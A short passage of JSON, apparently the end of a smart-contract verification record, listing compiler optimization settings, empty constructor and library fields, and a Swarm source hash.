ptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://a409a034ec35205dcb2c461ed1e52fbcc181673f7b1f763a19ede39ad3eb8dde"}]}